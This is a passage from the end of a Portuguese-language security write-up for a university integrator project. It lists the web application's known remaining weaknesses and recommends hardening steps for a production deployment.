- **Revogação de token em rotas comuns:** rotas administrativas revalidam o perfil no banco a cada requisição (2.3), mas as rotas de uso geral continuam aceitando qualquer token válido não expirado. Revogação imediata universal exigiria uma coluna `token_version` em `users`, comparada no `requireAuth`.
- **Logout no servidor:** o logout apenas descarta o token no cliente; não há denylist no servidor.
- **Trilha de auditoria:** cobre as alterações financeiras em lavagens (seção 8). Não cobre criação/remoção de clientes, veículos, produtos e usuários.
- **Minimização de dados na listagem de clientes:** `telefone` e `data_nascimento` continuam trafegando na listagem porque as telas de detalhe e edição leem da listagem compartilhada do `AppContext`, não de um `GET /api/clientes/:id` (o endpoint existe, mas nenhuma tela o consome). Reduzir isso exige primeiro consumir o endpoint de detalhe no frontend — mudança de comportamento de tela, fora do escopo de uma correção sem regressão. Ver 6.5.
- **Two-Factor Authentication (2FA):** não implementado.
- **Isolamento multi-tenant:** não existe — é uma decisão de produto (loja única), não uma limitação técnica pendente.
- **Rate limiting em memória:** o contador do `express-rate-limit` vive no processo. Com múltiplas instâncias, cada uma teria a própria cota; um deploy horizontal precisaria de um store compartilhado (Redis).
- **Dependências:** permanecem 2 vulnerabilidades `moderate` em cada pacote, sem correção disponível que não seja *major* com quebra de API (`react-router-dom` 6→7 no frontend; `csv-parse` e `qs` no backend). Nenhuma é `high` ou `critical`.

### 11.1 Recomendação para um ambiente de produção real

Se este sistema saísse do escopo acadêmico para produção real, o próximo investimento de segurança deveria ser, nesta ordem:

1. **HTTPS obrigatório** com reverse proxy TLS (o HSTS já está preparado).
2. **Token em cookie `httpOnly`**, substituindo o `localStorage`, para que XSS não resulte em roubo de sessão.
3. **`JWT_SECRET` em secret manager**, com rotação — fora do `.env` em disco.
4. **`token_version` em `users`** para revogação imediata em todas as rotas, não só nas administrativas.
5. **Trilha de auditoria ampliada** para criação e remoção de clientes, veículos e usuários.
6. **Rate limiting com store compartilhado** (Redis), caso haja mais de uma instância.

---

## 12. Referências

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PostgreSQL Foreign Keys](https://www.postgresql.org/docs/current/ddl-constraints.html#DDL-CONSTRAINTS-FK)
- [JWT — jwt.io](https://jwt.io/)
- [Node.js Security Best Practices](https://nodejs.dev/learn/nodejs-security-best-practices)

---

*Documento elaborado para o Projeto Integrador UNIVESP - Engenharia de Computação*
